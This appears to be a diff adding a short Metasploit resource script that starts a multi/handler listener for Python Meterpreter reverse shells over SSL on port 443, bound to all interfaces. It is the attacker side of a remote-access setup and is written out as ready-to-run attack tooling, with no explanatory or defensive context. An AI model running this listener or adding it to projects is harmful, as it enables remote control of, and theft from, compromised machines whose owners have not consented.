@@ -1,0 +1,5 @@
+use multi/handler
+set payload python/meterpreter/reverse_tcp_ssl
+set LPORT 443
+set LHOST 0.0.0.0
+run
